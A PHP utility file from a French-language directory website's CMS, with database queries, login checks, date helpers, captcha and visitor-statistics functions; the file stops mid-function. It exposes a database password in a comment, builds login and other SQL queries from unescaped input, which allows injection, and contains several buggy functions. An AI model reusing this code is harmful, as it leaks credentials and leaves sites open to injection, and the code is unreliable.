<?php
function connexionDB(){
	$host='127.0.0.1';$user='root';$pass='';$dbname='leguide_db';
	// $host='localhost';$user='DW65_db_user';$pass='Srvm471*';$dbname='DW65_leguide_db';
	mysql_connect($host,$user,$pass) or die('Impossible de se connecter au serveur de base de données');
	mysql_select_db($dbname);
}


function createFile($filename,$data){
	$fp = fopen($filename,'a+');
	fwrite($fp,$data);
	fclose($fp);
}


//CONVERTI UN JSON ARRAY EN JSON OBJECT
function JsonArray2JsonObject($strIn){
				
	$tab = str_split($strIn);
	unset($tab[0]);
	unset($tab[count($tab)]);
	
	$strOut = implode($tab);
	
	return $strOut;
}

function dateToDB($date){
	$date=str_replace('/','-',$date);
	
	$date = new DateTime($date);
	$out = $date->format('Y-m-d'); 
	return $out;
}

function phpArraySearch($array, $key, $value){
		$results = array();

		if (is_array($array))
		{
			if (isset($array[$key]) && $array[$key] == $value)
				$results[] = $array;

			foreach ($array as $subarray)
				$results = array_merge($results, phpArraySearch($subarray, $key, $value));
		}

		return $results;
	} 
	
function getContent($blocs_nom){
	$sql='select * 
	from blocs 
	inner join articles on articles.articles_id=blocs.articles_id 
	where blocs_nom="'.$blocs_nom.'" and blocs_statut="active"';
	$req=mysql_query($sql) or die(mysql_error());
	$d=mysql_fetch_object($req);
	
	$out=isset($d->titre)? array('id'=>$d->articles_id,'titre'=>$d->titre,'article'=>$d->article,'image'=>$d->image) : array('id'=>null,'titre'=>null,'article'=>null,'image'=>null);
	return $out;
}


function quickAdmin($id){
	if(isset($_SESSION['administrateur'])){ print ' | <a  href="kw-admin/article.php?page=modifier&id='.$id.'">Modifier</a>';}					
}

function getExtension($file)
{
	$ext=strtolower(substr(strrchr($file,'.'),1));
	return $ext;
}

function isImage($file)
{
	$img_ext=array('jpg','jpeg','gif','png');
	$ext=strtolower(substr(strrchr($file,'.'),1));
	return (in_array($ext,$img_ext))? true : false;
}

function getImages($dir_nom){			
	// dossier listé (pour lister le répertoir courant : $dir_nom = '.'  --> ('point')
	$dir = opendir($dir_nom) or die('Erreur de listage : le répertoire n\'existe pas'); // on ouvre le contenu du dossier courant
	$fichiers= array(); // on déclare le tableau contenant le nom des fichiers
	$dossiers= array(); // on déclare le tableau contenant le nom des dossiers
	 
	while($element = readdir($dir)) {
		if($element != '.' && $element != '..') {
			if (!is_dir($dir_nom.'/'.$element)) {
				if(isImage($dir_nom.'/'.$element)){
					$fichiers[] = $element;
				}
			}
			else {$dossiers[] = $element;}
		}
	}
	 
	closedir($dir);
	 
	return $fichiers;
}

function copierImages($dir_src,$dir_dst){
	$images=getImages($dir_src);
	foreach($images as $img){
		if (!copy($dir_src.'/'.$img, $dir_src.'/'.$img)) {
			$errors= error_get_last();
			echo '</li>'."Erreur de copie: ".$errors['type'].': '.$errors['message'].'</li>';
			
			$im = @imagecreatefromjpeg($img);
			
			imagejpeg ($im, $dir_src.'/'.$img);
		}
	}
}
////////////////////////// fn pour gérer les pages //////////////////////////
function getPage(){
	//récupérer la page en cours
	// $root='/www.laparoledevie.com/';//en ligne
	$root='/web/www.nouveauguide.ci/';  //local
	// print $root;
	// debug($_SERVER);
	// print($_SERVER['PHP_SELF']);
	$page=str_replace($root,null,$_SERVER['PHP_SELF']);
	// $page=str_replace('/',null,$page);
	$page=str_replace('.php',null,$page);
	// print $root;
	// print $page;
	$_SESSION['page']=$page;
	$currentPage=$_SESSION['page'];
	
	return $page;
}
/////////////// 
function incFormRecherche($src){
	$formRecherche=array(
	'actualites'=>'fr_actualites.php',
	'business'=>'fr_business.php',
	'entreprises'=>'fr_entreprises.php',
	'detailentreprises'=>'fr_detailentreprises.php',
	'ecoles'=>'fr_ecoles.php',
	'detailecoles'=>'fr_detailecoles.php',
	'boutiques'=>'fr_boutiques.php',
	'detailboutiques'=>'fr_detailboutiques.php',
	'hotels'=>'fr_hotels.php',
	'detailhotels'=>'fr_detailhotels.php',
	'cliniques'=>'fr_cliniques.php',
	'detailcliniques'=>'fr_detailcliniques.php',
	'restaurants'=>'fr_restaurants.php',
	'detailrestaurants'=>'fr_detailrestaurants.php',
	'transports'=>'fr_transports.php',
	'detailtransports'=>'fr_detailtransports.php',
	'docegare'=>'fr_docegare.php',
	'blackmarket'=>'fr_blackmarket.php',
	'immobilier'=>'fr_immobilier.php',
	'annonces'=>'fr_annonces.php',
	'detailannonces'=>'fr_detailannonces.php',
	'contacts'=>'fr_contacts.php'
	);	
	//
	require_once('modules/formRecherche/'.$formRecherche[$src]);
}

function incMenuGauche($src){
	$menuGauche=array(
	'actualites'=>'mg_actualites.php',
	'business'=>'mg_business.php',
	'entreprises'=>'mg_entreprises.php',
	'detailentreprises'=>'mg_detailentreprises.php',
	'ecoles'=>'mg_ecoles.php',
	'detailecoles'=>'mg_detailecoles.php',
	'boutiques'=>'mg_boutiques.php',
	'detailboutiques'=>'mg_detailboutiques.php',
	'hotels'=>'mg_hotels.php',
	'detailhotels'=>'mg_detailhotels.php',
	'cliniques'=>'mg_cliniques.php',
	'cliniques'=>'mg_cliniques.php',
	'detailcliniques'=>'mg_detailcliniques.php',
	'restaurants'=>'mg_restaurants.php',
	'detailrestaurants'=>'mg_detailrestaurants.php',
	'transports'=>'mg_transports.php',
	'detailtransports'=>'mg_detailtransports.php',
	'docegare'=>'mg_docegare.php',
	'blackmarket'=>'mg_blackmarket.php',
	'immobilier'=>'mg_immobilier.php',
	'annonces'=>'mg_annonces.php',
	'detailannonces'=>'mg_detailannonces.php',
	'contacts'=>'mg_contacts.php'
	);	
	//
	require_once('modules/menuGauche/'.$menuGauche[$src]);
}

function pageTitle($page,$param){
	$pageTitle=array(
	'actualites'=>'LISTE DES ACTUALITES',
	'business'=>'LISTE DES BUSINESS',
	'entreprises'=>'LISTE DES ENTREPRISES',
	'detailentreprises'=>'PLUS D\'INFO SUR UNE ENTREPRISE',
	'ecoles'=>'LISTE DES ECOLES',
	'detailecoles'=>'PLUS D\'INFO SUR UNE ECOLE',
	'boutiques'=>'LISTE DES BOUTIQUES',
	'detailboutiques'=>'PLUS D\'INFO SUR UNE BOUTIQUE',
	'hotels'=>'LISTE DES HOTELS',
	'detailhotels'=>'PLUS D\'INFO SUR UN HOTEL',
	'cliniques'=>'LISTE DES CLINIQUES',
	'detailcliniques'=>'PLUS D\'INFOS SUR UNE CLINIQUE',
	'restaurants'=>'LISTE DES RESTAURANT',
	'detailrestaurants'=>'PLUS D\'INFO SUR UN RESTAURANT',
	'transports'=>'LISTE DES COMPAGNIES DE TRANSPORT',
	'detailtransports'=>'PLUS D\'INFOS SUR UNE COMPAGNIE DE TRANSPORT',
	'docegare'=>'LES DOCUMENTS EGARES',	''=>'fr_blackmarket.php',
	'blackmarket'=>'LISTE DES ARTICLES A VENDRE',
	'immobilier'=>'ESPACE IMMOBILIER',
	'annonces'=>'ESPACE ANNONCES',
	'detailannonces'=>"DETAILS D'UNE ANNONCE",
	'contacts'=>'NOS CONTACTS'
	);	
	
	$sT=array(
	''=>'',
	'presentation',
	'publications',
	'galleriephoto',
	'gallerievideo',
	'contact'
	);

	$sousTitre=array(
	''=>'',
	'presentation'=>' :: PRÉSENTATION',
	'publications'=>' :: PUBLICATIONS',
	'galleriephoto'=>' :: GALLERIE PHOTO',
	'gallerievideo'=>' :: GALLERIE VIDÉO',
	'contact'=>' :: CONTACT'
	);

	//
	$param= in_array($param,$sT)? $param : null;
	print $pageTitle[$page].$sousTitre[$param];
}

function debug($var){
	print '<pre>';
	print_r($var);
	print '</pre>';
}

///affichage de la liste des pays
function afficherContinents($selected=null){
	$sql='select * from continents where continents_statut="active" order by continents_nom asc';
	$req=mysql_query($sql) or die(mysql_error());
	while($d=mysql_fetch_object($req)){
		print '<option value="'.$d->continents_id.'">'.$d->continents_nom.'</option>';
	}
}
///affichage de la liste des pays
function afficherPays($selected='2'){
	$sql='select * from pays where pays_statut="active" order by pays_nom asc';
	$req=mysql_query($sql) or die(mysql_error());
	while($d=mysql_fetch_object($req)){
		$select=($d->pays_id==$selected)? 'selected' : null;
		print '<option value="'.$d->pays_id.'" '.$select.'>'.$d->pays_nom.'</option>';
	}
}
///affichage de la liste des villes 
function afficherVille($pays_id=null,$selected=null){
	$where=!empty($pays_id)? ' where pays_id="'.$pays_id.'"' : null;
	// $where='where pays_id="'.$pays_id.'"';
	$sql='select * from villes '.$where.' order by villes_nom asc';
	$req=mysql_query($sql) or die(mysql_error());
	while($d=mysql_fetch_object($req)){
		$select=($d->villes_id==$selected)? 'selected' : null;
		print '<option value="'.$d->villes_id.'"'.$select.'>'.$d->villes_nom.'</option>';
	}
}

///////////////////**/////////////////////////

function kraksecurise($chaine){
	$chaine=mysql_real_escape_string(htmlspecialchars(trim($chaine)));
	return $chaine;
}

function ecrit($chaine){
	print stripslashes($chaine);
}


function chooseColor($x)
{	
	$titre='<><><><><><><><><><><><>
	<b>PERSONNALISER LE SITE</b><br/>';
	$select='<label>Couleur:</label>
	<select id="siteColor"  onChange="setSiteColor(this.value)">
		<option value="bleu">Bleu</option>
		<option value="vert">Vert</option>
		<option value="orange">Orange</option>
		<option value="rouge">Rouge</option>
		<option value="rose">Rose</option>
		<option value="violet">Violet</option>
	</select>';
		$out=($x=1)? $select:$titre.$select;
	echo $out;
}

/* Fonctions créee par Armand Kouassi le 09/08/2010 */

function krakResumer($chaine,$n=100) 
{
	$out=null;$i=0;$j=0;
	$tab=str_split($chaine);

	$size=count($tab);
	if($size>$n)
	{
		for($i=0;$i<$n;$i++)
		{
			$char=$tab[$i];
			$out.=$char;
		}
			
		for($j=$n;$j<$size;$j++)
		{   
			$char=$tab[$j];
			if($char==' ')
			{
				$char='...';
				$j=$size+10;
			}
			
			$out.=$char;
		}
	}	
	else{$out=$chaine;}

    return stripslashes(stripslashes($out));
}
/*fonction qui permet de gérer une New Letter*/
function InsertNewLetter(){
$erreur=null;$email=null;
/*
$sql="CREATE TABLE IF NOT EXIST `snewletter` (
`id` INT NOT NULL ,
`email` VARCHAR( 255 ) NOT NULL 
) ENGINE = innodb COMMENT = 'Enregistre les e-mails des internautes';
";
mysql_query($sql);
*/
print '<div id="newSletter">
    <form method="post" action="">
        <label>Email:</label>
        <input style="width:100px;" type="text" name="email" />
        <input style="background:darkblue;height:30px; padding:0px 2px;color:white;" type="image" name="newsletter" value="Souscrire"/>
    </form>
</div>';
//
if(isset($_POST['newsletter']))
{	
	$info=null;
    $email=htmlspecialchars(mysql_real_escape_string($_POST['newsletter']));
    $format_email="#^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]{2,}\.[a-z]{2,4}$#";
	if(!empty($email))
	{
        if(!preg_match($format_email,$email))
        {
	   	   $info="E-mail invalide";			
        }
        else{
            $sql2='INSERT INTO `krakweb_newsletter` ( `id` , `email` ) VALUES ("'.null .'", "' . $email .'")';
            if(mysql_query($sql2)){
				 $info= '<font color="green">Souscription réussie</font>';
			}else {
				 $info= '<font color="red">Souscription échouée</font>';
			}
        }
	}else{ $info="Entrez votre e-mail";}
	print $info;
}






}

////////////////////////////////////////////////////

function EstAdministrateur($tableAdmin,$loginField,$login,$passField,$pass)
{
	$sql='SELECT * FROM '.$tableAdmin.' WHERE '.$loginField.'="'.$login.'" AND '.$passField.'="'.$pass.'"';
	$req=mysql_query($sql);$n=mysql_num_rows($req);
	
	if($n==1){	return true; }else{ return false; }
}////////////////////////////////////////////////////

function estMembre($tableAdmin,$loginField,$login,$passField,$pass)
{
	$sql='SELECT * FROM '.$tableAdmin.' WHERE '.$loginField.'="'.$login.'" AND '.$passField.'="'.$pass.'"';
	$req=mysql_query($sql);$n=mysql_num_rows($req);
	
	if($n==1){	return true; }else{ return false; }
}
/////////////////////////////////////////////////
function krakDBGet($table,$field,$refField,$refVal){
	$sql='select * from '.$table.' where `'.$refField.'`="'.$refVal.'"';
	$req=mysql_query($sql);$d=mysql_fetch_object($req);
	$valueoffield=$d->code;
	return $valueoffield;
}

/////////////////////////////////////////////////
function genererCodeFournisseur($login){
	$table=array();
	$sql='select * from fournisseurs where `login`="'.$login.'"';
	$req=mysql_query($sql);$d=mysql_fetch_object($req);
	$valueoffield=$d->code;	

	$code=null;
	$code.='ECO-F';
	$code.=$id;
}
/////////////////////////////////////////////////
function krakVerification($table,$champ1,$Valeurchamp1,$champ2,$Valeurchamp2)
{
	$sql="SELECT COUNT(*) FROM $table WHERE $champ1='$Valeurchamp1' AND $champ2='$Valeurchamp2'";
	$req=mysql_query($sql);
	$n=mysql_result($req,0);
	if($n==1)
	{
		return true;
	}
	else
	{
		return false;
	}
}
/////////////////////////////////// CRIPTAGE DE DONNEES ///////////////////////////////////////////
	function krakcript($chaine)
	{
		$alphabet=Array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z");
		for($i=0;$i<26;$i++)
		{
			$caractere=$alphabet[$i];
			$numero=$i+1;
			$krak="scriptlanguage=javascript je suis armand kouassi, electronicien et informaticien programmeur, c'est mon ami backary qui m'aide souvent, dieu n'aime pas le hacking";
			$krak=md5(sha1(md5($krak)));
			$chaine=str_replace($caractere,$numero.$krak,$chaine);
			$chaine=sha1(md5(sha1($chaine)));
		}
		return $chaine;
	}
///////////////////////////////////// affiche la liste des pays ////////////////////////////////////////
function AfficherPays1()
{
	$Tabpays=array("Afrique-du-sud","Albanie","Allemagne","Andorre","Antilles-Néerlandaises","Arabie-saoudite","Argentine"
	,"Arménie","Australie","Autriche","Belarussie","Belgique","Bengladesh","Bermudes","Bolivie","Bosnie-Herzégovine","Brésil"
	,"Bulgarie","Cambodge","Cameroun","Canada","Chine","Chypre","Corée-du-Sud","Cote d\'Ivoire","Croatie"
	,"Cuba","Danemark","Egypte","Emirates-arabes-unis","Estonie","Etats-Unis","Finlande","France","Gabon","Georgie","Gibraltar","Grèce",	
	"Greenland","Guadeloupe","Guernsey","Guinée-française","Hong-Kong","Hongrie","Ile-Mayotte","Iles-Cayman",
	"Iles-Faroe","Iles-Fidji","Inde","Indonésie","Irelande","Islande","Isle-of-Man","Israel","Italie","Jamaïque",
	"Japon","Jersey","Jordanie","Kazakhstan","Kenya","Lettonie","Liban","Liechtenstein","Lithuanie","Luxembourg","Macau",
	"Macédoine","Madagascar","Malaysie","Maldives","Mali","Malte","Maroc","Martinique","Mauritanie","Mexique",
	"Moldavie","Monaco","Mongolie","Mozambique","Népal","Niger","Nigeria","Norvège","Nouvelle-Calédonie","Nouvelle-Zélande","Pakistan",
	"Palestine","Panama","Paraguay","Pays-Bas","Perou","Philippines","Pologne","Porto-Rico","Portugal","Qatar","République-Dominicaine",
	"Republique-Tcheque","Réunion","Romanie","Royaume-Uni","Russie","Rwanda","Sénégal","Serbie-et-Monténégro","Seychelles",
	"Singapour","Slovaquie","Slovénie","Sri-Lanka","Suède","Suisse","Syrie","Taïwan","Tchad","Thaïlande","Tunisie","Turquie",
	"Ukraine","Vénézuela","Vietnam","Yémen");
	
	foreach($Tabpays as $pays){echo '<option value="'.$pays.'">'.stripslashes($pays).'</option>';}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////
function AfficherVille1()
{
	$sql='select * from ville where nom!="Abidjan" order by nom asc';
	$req=mysql_query($sql);
	while($data=mysql_fetch_object($req)){
		print '<option value="'. stripslashes($data->nom).'">'.stripslashes($data->nom) .'</option>';
	}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
function AfficherNombre($min,$max)
{
	for($i=$min;$i<=$max;$i++){echo '<option value="'.$i.'">'.$i.'</option>';}
}


////////////quelques fonctions/////////////////
	function krakDate(){
		$semaine=array("Dimanche","Lundi","Mardi","Mercredi","Jeudi","Vendredi","samedi");
		$mois=array("Janvier","Février","Mars","Avril","Mai","juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre");
		$krakDate=getdate();
		$numero_mois =date('m')-1;
		$datejour =date('j');
		$numero_semaine=date('w');
		$annee =date('Y');	
		$heure=date("H:i:s");
		$strjour=$semaine["$numero_semaine"];
		$strmois=$mois["$numero_mois"];
		$Aujourdhui="$strjour le $datejour $strmois $annee";
		return $Aujourdhui;
	}
///////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

function krakOrdonnerDate($date)
{
	sscanf($date, "%4s-%2s-%2s %2s:%2s:%2s", $annee, $mois, $jour, $heure, $minute, $seconde);
	$krakdate=$jour.'-'.$mois.'-'.$annee;//.':'.$seconde;
	if($krakdate=="00-00-0000"){$krakdate=null;}
	return $krakdate;
}
	
///////////////////////////////////////////////////////////////////////////////

function krakOrdonnerDate2($date)
{
	sscanf($date, "%4s-%2s-%2s %2s:%2s:%2s", $annee, $mois, $jour, $heure, $minute, $seconde);
	$krakdate=$jour.'-'.$mois.'-'.$annee.' à '.$heure.':'.$minute;//.':'.$seconde;
	if($krakdate=="00-00-0000 à 00:00"){$krakdate=null;}
	return $krakdate;
}
	
///////////////////////////////////////////////////////////////////////////////

function krakOrdonnerDate3($date)
{
	sscanf($date, "%4s-%2s-%2s %2s:%2s:%2s", $annee, $mois, $jour, $heure, $minute, $seconde);
	$krakdate=$jour.'-'.$mois.'-'.$annee;
	if($krakdate=="00-00-0000"){$krakdate=null;}
	return $krakdate;
}
	
///////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////

function timeFromDB($heure)
{
	sscanf($heure, "%2s:%2s:%2s",$h, $mn, $s);
	$krakHeure=$h.':'.$mn;
	return $krakHeure;
}

///////////////////////////////////////////////////////////////////////////////

function dateToDB2($date){
	sscanf($date, "%2s-%2s-%4s",$j, $m, $a);
	$newDate=$a.'-'.$m.'-'.$j;
	return $newDate;
}
///////////////////////////////////////////////////////////////////////////////

function dateFromDB($date){
	sscanf($date, "%4s-%2s-%2s",$a, $m, $j);
	$newDate=$j.'-'.$m.'-'.$a;
	return $newDate;
}
	
///////////////////////////////////////////////////////////////////////////////
/////////////////////: créer un captcha //////////////////////////////////////////
function ChaineAleatoire($n)
{
    $numero=array();$mot=null;
	$caracteres=array(0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
	"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
	
	for($i=0;$i<$n;$i++)
	{
		$numero[$i]=mt_rand(0,61);
	}
	for($i=0;$i<$n;$i++)
	{
		$mot.=$caracteres[$numero[$i]];
	}	
	return $mot;
}

function CreerCaptcha($texte)
{
	//les copuleurs
	$blanc = imagecolorallocate($img, 255, 255, 255); 
	$noir = imagecolorallocate($img, 0, 0, 0);
	$bleu=	imagecolorallocate($img, 0x00, 0x00, 0xff);
	$vert=	imagecolorallocate($img, 0x00, 0xff, 0x00);
	$rouge=	imagecolorallocate($img, 0xff, 0x00, 0x00);
	$rose=	imagecolorallocate($img, 0xff, 0x00, 0xff);
	$orange=imagecolorallocate($img, 0xff, 0xf0, 0x01);
	
	$couleurs=array($bleu,$vert,$rouge,$rose,$orange);
	$x=mt_rand(0,2);
	$textcolor=$couleurs[$x];
	header("Content-Type: image/jpeg");
	$image=imagecreate(100,500);
	imagestring($image,3,2,2,$texte,$bleu);
	imagejpeg($image);
	imagedestroy($img);
}

/**/
function krakBuildMenuV(array $menu)
{
	print '<div id="menuV">';
	print '<ul>';
	foreach($menu as $label=>$url){
		print '<li><a href="'.$url.'">'.$label.'</a></li>';
	}
	print '</ul>';
	print '</div>';
}

function krakBuildMenu(array $menu,$orientation='h')
{
	$menuName=($orientation=='h')? 'menu' : 'menuV';
	print '<div id="'.$menuName.'">';
	foreach($menu as $label=>$url){
		print '<div class="item"><a href="'.$url.'">'.$label.'</a></div>';
	}
	print '</div>';
}


/////////////////////redimmensionne une image/////////////////////
function krakResizeImage($imagePath,$x=100,$y=100)
{
	Header("Content-type: image/jpeg");
	$newImg = imagecreatefromjpeg($imagePath);
	$size = getimagesize($imagePath);
	$miniImg = imagecreatetruecolor ($x, $y);
	imagecopyresampled ($miniImg,$newImg,0,0,0,0,$x,$y,$size[0],$size[1]);
	imagejpeg($miniImg);
	// affiche
	echo 'La photo a été redimensionnée automatiquement.
		  <br /> 
		  <img src="'.$imagePath.'" alt="" />
		  ';
}

/////////////////////////////////////////   AFFICHAGE DE BANNIERE PUBLICITAIRE     ////////////////////////////////////////////////////////////////

function krakDisplayPub($bloc,$width='auto',$height='auto'){
	$ourPub='<div style="margin:20px;height:60px;">Pour afficher votre publicité ici, contactez-nous au<b> 23 51 12 70</b></div>';
	$sql='select * from publicites where publier=1 and bloc="'.$bloc.'" order by id desc';
	$req=mysql_query($sql);$n=mysql_num_rows($req);
	if($n>0){
		$d=mysql_fetch_object($req);$pub=$d->pub;
		$swf='<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="'.$width.'" height="'.$height.'">
			<param name="movie" value="swf/pub/'.$pub.'" />
			<param name="quality" value="high" />
			<param name="wmode" value="transparent" />
			<embed src="swf/pub/'.$pub.'" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash"  width="'.$width.'" height="'.$height.'"></embed>		
		</object>';
		$gif='<img src="swf/pub/'.$pub.'" alt="" style="max-width:'.$width.'px;max-height:'.$height.'px;"/>';
		
		$currentPub=($d->type=='swf')? $swf : $gif ;
		print '<div class="krakPub">';
			print $currentPub;
		print '</div>';
	}else{
		print $ourPub;
	} 
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
function krakDisplayFlashInfo(){
	/*print '<marquee direction="up" scrollamount="1" style="height:100px; margin:5px;text-align:center;">
				SITE EN CONSTRUCTION !<br/>
				DESIGNED BY ARMAND KOUASSI<br/>
				CEL:<b>04 78 36 89</b><br/>
				E-mail: <b>krak225@yahoo.ca</b><br/>
				Website: <b>www.krak225.fr</b><br/>
				<img style="height:100px;" src="'.sitePath.'/concepteur/krak.gif" alt="krak Technologie"/>
			</marquee>';*/
			
}
function krakDisplayConceptorInfo(){
	print '<img style="height:100px;" src="'.sitePath.'/concepteur/krak.gif" alt="krak Technologie"/>';
}

class krakSqlQuery{
	//les propriétés
	public $req;
	public $sql;
	var $num;var $data;
	//le constructeur
	function __construct($sql){
		$this->sql=$sql;
	}
	//les méthodes
	function executeReq(){
		$this->req=mysql_query($this->sql);
	}
	function getNum(){
		$this->num=mysql_num_rows($this->req);
		return $this->num;
	}
	function getData(){
		$this->executeReq();
		$this->data=mysql_fetch_object($this->req);
		return $this->data;
	}
	function write($x){
		$this->getData();
		print $this->data->$x;
	}	
	function getValue($x){
		$this->getData();
		return $this->data->$x;
	}
	function attr($x){
		$this->getData();
		print $this->data->$x;
	}
	
	function writeBoucle($chaine){
		$this->executeReq();
		while($this->data=mysql_fetch_object($this->req)){
			print $chaine;
		}
	}
	
}

function krakDeniedAccess($url="../index.php",$img="../images/loader.gif"){
print '
<html>
<head>
<title>ECOTAMBOUR: : : ESPACE RESERVE</title>
<meta http-equiv="refresh" content="5; url='.$url.'">
<script type="text/javascript">
<!--
	var cpt=6;var i=0; 
	var x=setInterval(\'krak()\',1000);
	function krak(){
		cpt --;
		document.getElementById(\'loader\').innerHTML=cpt;
	}
-->
</script>
<style type="text/css">
<!--
html{width:100%;height:100%;}
body{margin:0px;padding:0px;background:white;}
#krakDenied{width:500px;height:300px;border:10px solid #0b94f7;margin:auto;margin-top:15%;}
h1{color:darkblue;text-align:center;border-bottom:1px solid orangered;margin:5px 10px;}
#text{color:red;font-weight:bold;text-align:center;margin:70px 0px 30px 0px;}

#loader{
	font-size:20px;
	color:red;
	background-image:url(\''. $img .'\');
	margin:auto;
	padding-top:20px;
	height:46px;
	width:66px;
	text-align:center;
-->
</style>
</head>
<body>
<div id="krakDenied">
<h1>krakCMS Version1.0</h1>
<div id="text" >ACCES NON AUTORISE</div>

			<div id="loader"></div>
</div>
</body>
</html>';
}

function krakPageOnBuilding(){
	print '<div class="onBuilding">PAGE EN CONSTRUCTION</div>';
}

////////////////////////////////////////
function krakCreateTableGares()
{
	$sql='CREATE TABLE IF NOT EXISTS `transport_gares` (
	`id` int(10) unsigned NOT NULL auto_increment,
	`id_compagnie` int(10) NOT NULL,';
	$rq=mysql_query('select * from ville order by id asc');
	while($d=mysql_fetch_object($rq)){
		$sql.='`gare_'.$d->id.'` tinyint(1) NOT NULL,';
	}  
	$sql.=' PRIMARY KEY  (`id`)
    ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=0;';
	// print $sql;
	mysql_query($sql) or die(mysql_error());
}

// Coupe un texte à $longueur caractères, sur les espaces, et ajoute des points de suspension...
function tronque($chaine, $longueur = 120) 
{
 
	if (empty ($chaine)) 
	{ 
		return ""; 
	}
	elseif (strlen ($chaine) < $longueur) 
	{ 
		return $chaine; 
	}
	elseif (preg_match ("/(.{1,$longueur})\s./ms", $chaine, $match)) 
	{ 
		return $match [1] . "..."; 
	}
	else 
	{ 
		return substr ($chaine, 0, $longueur) . "..."; 
	}
}


//fonction écrite le * septembre 2011

function canAdd($table,$user){
	$sql='select * from recharges where code="'.$user.'"';
	$req=mysql_query($sql);
	$n=mysql_num_rows($req);
	if($n>0){
		$d=mysql_fetch_object($req);
		if($d->$table > 0){
			print '<div class="notification"><b><u>Notification:</u></b> <i> Il vous reste '.($d->$table - 1).' enregistrements après celui-ci</i></div>';return true;
		}
		else{
			return false;
		}
	}
}

//fonction écrite le 13 septembre 2011 par Armand Kouassi
function displayPhoneNumbersOf($espace,$user){
	$sql='select * from quelcontactafficher where espace="'.$espace.'"';$req=mysql_query($sql);
	$d=mysql_fetch_object($req);
	if($d->$user==1)
		return true;
	else 
		return false;

}


//fonctions écrites le 16 septembre 2011 par Armand Kouassi

function krakStatistiques(){
	// récupération de l'heure courante
	$date_courante = date("Y-m-d H:i:s");  
	 
	// récupération de l'adresse IP du client (on cherche d'abord à savoir si il est derrière un proxy)
	if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
	}  
	elseif(isset($_SERVER['HTTP_CLIENT_IP'])) {  
	$ip = $_SERVER['HTTP_CLIENT_IP'];  
	}  
	else {  
	$ip = $_SERVER['REMOTE_ADDR'];  
	}  
	// récupération du domaine du client
	$host = gethostbyaddr($ip);  
	 
	// récupération du navigateur et de l'OS du client
	$navigateur = $_SERVER['HTTP_USER_AGENT'];  
	 
	// récupération du REFERER
	if (isset($_SERVER['HTTP_REFERER'])) { 
	   // if (eregi($_SERVER['HTTP_HOST'], $_SERVER['HTTP_REFERER'])) { 
		  // $referer =''; 
	   // } 
	   // else { 
		  $referer = $_SERVER['HTTP_REFERER']; 
	   // }  
	}  
	else {  
	$referer ='';  
	}  
	 
	// récupération du nom de la page courante ainsi que ses arguments
	if ($_SERVER['QUERY_STRING'] == "") {  
	$page_courante = $_SERVER['PHP_SELF'];  
	}  
	else {  
	$page_courante = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];  
	}  
	 
	// insertion des éléments dans la base de données
	$sql = 'INSERT INTO statistiques VALUES("", "'.$date_courante.'", "'.$page_courante.'", "'.$ip.'", "'.$host.'", "'.$navigateur.'", "'.$referer.'")';  
	mysql_query($sql) or die('Erreur : '.$sql.'<br />'.mysql_error());  
}

/**/
function videoPlayer($player='modules/video/player.swf',$video){
	print '						
		<div id="lecteur" style="width:502px;margin:auto;">
		<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="550" height="400">
			<param name="movie" value="'.$player.'" />
			<param name="quality" value="high" />
			<!--<param name="wmode" value="transparent" />-->
			<embed src="modules/video/player.swf?controlbar=bottom&file='.$video.'&autostart=true&volume=50&repeat=all" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash"  width="500" height="400"></embed>		
		</object>
	</div>';
}

function imageDisplay($imgSrc,$desc='Une image de la gallérie photo'){
	print '<div id="imagedisplayer" style="width:502px;margin:auto;"><img style="width:496px;padding:2px;" src="'.$imgSrc.'"/><div class="imgDesc" style="padding:5px;text-align:center;border:1px solid #eee;-webkit-border-radius:3px;-moz-border-radius:3px;-border-radius:3px;"/>'.$desc.'</div></div>';
}


/*14-12-2011*/
function canSubmit1($table,$interval=30){
	$ip=$_SERVER['REMOTE_ADDR'];
	$sql='select * from cansubmit where (`table`="'.$table.'" and `ip`="'.$ip.'") order by id desc';
	$req=mysql_query($sql) or die (mysql_error());$n=mysql_num_rows($req);
	$dt=$interval+1;
	if($n>0){
		$d=mysql_fetch_object($req);
		$t0=$d->timestamp;
		$t1=time();
		$dt=$t1-$t0;
	}
	if($dt>$interval){
		return true;
	}else{
		return false;
	}
	
}

function canSubmit2($table,$interval=30){
	$ip=$_SERVER['REMOTE_ADDR'];
	$date=date('Y-m-d');
	$id_session=$_SESSION['submitId'];
	$sql='select * from cansubmit2 where (`table`="'.$table.'" and `id_session`="'.$id_session.'")  order by id desc';
	$req=mysql_query($sql) or die (mysql_error());$n=mysql_num_rows($req);
	$dt=$interval+1;
	if($n>0){
		$d=mysql_fetch_object($req);
		$t0=$d->timestamp;
		$t1=time();
		$dt=$t1-$t0;
	}
	if($dt>$interval){
		return true;
	}else{
		return false;
	}
	
}

function updateSubmitTable($table){
	$time=time();
	$date=date('Y-m-d H:i:s');
	$ip=$_SERVER['REMOTE_ADDR'];
	$id_session=$_SESSION['submitId'];
